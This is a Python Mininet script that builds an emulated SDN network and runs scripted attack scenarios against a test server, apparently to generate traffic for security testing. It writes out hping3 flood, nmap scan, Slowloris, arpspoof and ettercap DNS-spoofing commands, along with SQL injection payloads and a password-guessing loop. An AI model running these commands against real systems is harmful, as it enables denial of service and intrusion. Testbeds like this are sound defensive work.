# mininet_testbed.py

from mininet.topo import Topo
from mininet.net import Mininet
from mininet.node import OVSKernelSwitch, RemoteController
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink
import time
import psutil
import json
from datetime import datetime
import os
import threading


class TestTopology(Topo):
    def build(self):
        # Switches
        s1 = self.addSwitch('s1', protocols='OpenFlow13')
        s2 = self.addSwitch('s2', protocols='OpenFlow13')
        s3 = self.addSwitch('s3', protocols='OpenFlow13')

        # Hosts
        h1 = self.addHost('h1', ip='10.0.0.1/24')  # Server
        h2 = self.addHost('h2', ip='10.0.0.2/24')  # Normal Client
        h3 = self.addHost('h3', ip='10.0.0.3/24')  # Attacker 1
        h4 = self.addHost('h4', ip='10.0.0.4/24')  # Attacker 2
        h5 = self.addHost('h5', ip='10.0.0.5/24')  # Normal Client
        h6 = self.addHost('h6', ip='10.0.0.6/24')  # Monitoring Host

        # Links
        self.addLink(h1, s1, cls=TCLink, bw=100, delay='2ms')
        self.addLink(h2, s1, cls=TCLink, bw=10, delay='5ms')
        self.addLink(h3, s2, cls=TCLink, bw=10, delay='5ms')
        self.addLink(h4, s2, cls=TCLink, bw=10, delay='5ms')
        self.addLink(h5, s3, cls=TCLink, bw=10, delay='5ms')
        self.addLink(h6, s3, cls=TCLink, bw=100, delay='2ms')
        self.addLink(s1, s2, cls=TCLink, bw=50, delay='10ms')
        self.addLink(s2, s3, cls=TCLink, bw=50, delay='10ms')
        self.addLink(s1, s3, cls=TCLink, bw=50, delay='10ms')


class NetworkTester:
    def __init__(self, net):
        self.net = net
        self.test_scenarios = {
            'normal_traffic': self.generate_normal_traffic,
            'ddos_attack': self.generate_ddos_attack,
            'port_scan': self.generate_port_scan,
            'slowloris': self.generate_slowloris_attack,
            'sql_injection': self.generate_sql_injection,
            'arp_spoofing': self.generate_arp_spoofing_attack,
            'dns_spoofing': self.generate_dns_spoofing_attack,
            'brute_force': self.generate_brute_force_attack
        }
        self.metrics = {
            'start_time': None,
            'end_time': None,
            'scenarios': {},
            'system_metrics': []
        }
        self.log_dir = 'test_logs'
        os.makedirs(self.log_dir, exist_ok=True)

    def _collect_system_metrics(self):
        metrics = {
            'timestamp': datetime.now().isoformat(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'network_io': psutil.net_io_counters()._asdict()
        }
        self.metrics['system_metrics'].append(metrics)

    def generate_normal_traffic(self, duration=30):
        info("\n[INFO] Generating normal traffic...\n")
        h1, h2, h5 = self.net.get('h1', 'h2', 'h5')
        h1.cmd('python -m SimpleHTTPServer 80 &')
        h2.cmd('for i in {1..50}; do wget -q -O /dev/null http://10.0.0.1:80; sleep 0.2; done &')
        h5.cmd('for i in {1..50}; do wget -q -O /dev/null http://10.0.0.1:80; sleep 0.3; done &')
        h2.cmd('ping 10.0.0.1 -c 10 -i 0.2 &')
        h5.cmd('ping 10.0.0.1 -c 10 -i 0.3 &')
        h1.cmd('iperf -s -p 5001 &')
        h2.cmd('iperf -c 10.0.0.1 -p 5001 -t 20 -i 1 &')
        h5.cmd('iperf -c 10.0.0.1 -p 5001 -t 20 -i 1 &')
        time.sleep(duration)

    def generate_ddos_attack(self, duration=30):
        info("\n[ALERT] Simulating DDoS attack...\n")
        h3, h4 = self.net.get('h3', 'h4')
        h3.cmd('hping3 -S -p 80 --flood 10.0.0.1 &')
        h4.cmd('hping3 --udp -p 53 --flood 10.0.0.1 &')
        time.sleep(duration)
        h3.cmd('killall hping3')
        h4.cmd('killall hping3')

    def generate_port_scan(self, duration=30):
        info("\n[ALERT] Simulating port scan...\n")
        h3 = self.net.get('h3')
        h3.cmd('nmap -sS -T4 10.0.0.1 &')
        h3.cmd('nmap -sU -T4 --top-ports 100 10.0.0.1 &')
        time.sleep(duration)
        h3.cmd('killall nmap')

    def generate_slowloris_attack(self, duration=30):
        info("\n[ALERT] Simulating Slowloris attack...\n")
        h4 = self.net.get('h4')
        h1 = self.net.get('h1')
        h1.cmd('apache2 -k start')
        h4.cmd('python3 slowloris.py 10.0.0.1 --port 80 --sockets 1000 &')
        time.sleep(duration)
        h4.cmd('killall python3')
        h1.cmd('apache2 -k stop')

    def generate_sql_injection(self, duration=30):
        info("\n[ALERT] Simulating SQL injection...\n")
        h3 = self.net.get('h3')
        payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT * FROM users; --"]
        for payload in payloads:
            h3.cmd(f'curl "http://10.0.0.1/login.php?username=admin&password={payload}" &')
            time.sleep(1)
        time.sleep(duration)

    def generate_arp_spoofing_attack(self, duration=30):
        info("\n[ALERT] Simulating ARP spoofing attack...\n")
        h3 = self.net.get('h3')
        h3.cmd('apt-get install -y dsniff > /dev/null 2>&1')
        h3.cmd('arpspoof -i h3-eth0 -t 10.0.0.2 10.0.0.1 &')
        time.sleep(duration)
        h3.cmd('killall arpspoof')

    def generate_dns_spoofing_attack(self, duration=30):
        info("\n[ALERT] Simulating DNS spoofing attack...\n")
        h4 = self.net.get('h4')
        h4.cmd('apt-get install -y ettercap-text-only > /dev/null 2>&1')
        h4.cmd('ettercap -T -q -i h4-eth0 -P dns_spoof -M arp:remote /10.0.0.2// /10.0.0.1// &')
        time.sleep(duration)
        h4.cmd('killall ettercap')

    def generate_brute_force_attack(self, duration=30):
        info("\n[ALERT] Simulating brute force attack...\n")
        h3 = self.net.get('h3')
        for i in range(50):
            h3.cmd(f'curl "http://10.0.0.1/login.php?username=admin&password=guess{i}" &')
            time.sleep(0.3)
        time.sleep(duration)

    def run_test_scenario(self, scenario_name, duration=30):
        if scenario_name not in self.test_scenarios:
            info(f"\n[ERROR] Unknown test scenario: {scenario_name}\n")
            return

        info(f"\n[INFO] Running test scenario: {scenario_name}\n")
        self.metrics['scenarios'][scenario_name] = {
            'start_time': datetime.now().isoformat(),
            'duration': duration
        }

        metric_thread = threading.Thread(
            target=lambda: [self._collect_system_metrics() for _ in range(duration)]
        )
        metric_thread.start()

        self.test_scenarios[scenario_name](duration)
        metric_thread.join()

        self.metrics['scenarios'][scenario_name]['end_time'] = datetime.now().isoformat()
        self._save_metrics()

    def _save_metrics(self):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(self.log_dir, f'test_metrics_{timestamp}.json')
        with open(filename, 'w') as f:
            json.dump(self.metrics, f, indent=2)
        info(f"\n[INFO] Metrics saved to {filename}\n")

    def cleanup(self):
        info("\n[INFO] Cleaning up...\n")
        cmds = ['killall hping3', 'killall nmap', 'killall python3',
                'killall iperf', 'killall apache2', 'killall arpspoof', 'killall ettercap']
        for host in self.net.hosts:
            for cmd in cmds:
                host.cmd(cmd)


def start_network():
    topo = TestTopology()
    net = Mininet(
        topo=topo,
        controller=lambda name: RemoteController(name, ip='127.0.0.1', port=6653),
        switch=OVSKernelSwitch,
        autoSetMacs=True
    )
    net.start()
    info("\n[INFO] Waiting for controller...\n")
    time.sleep(5)

    for switch in net.switches:
        switch.cmd('ovs-vsctl set bridge', switch.name, 'protocols=OpenFlow13')
        switch.cmd('ovs-ofctl del-flows', switch.name)

    net.pingAll()

    tester = NetworkTester(net)
    test_scenarios = [
        ('normal_traffic', 30),
        ('ddos_attack', 30),
        ('port_scan', 30),
        ('slowloris', 30),
        ('sql_injection', 30),
        ('arp_spoofing', 30),
        ('dns_spoofing', 30),
        ('brute_force', 30)
    ]

    for scenario, duration in test_scenarios:
        tester.run_test_scenario(scenario, duration)

    tester.cleanup()
    CLI(net)
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    start_network()
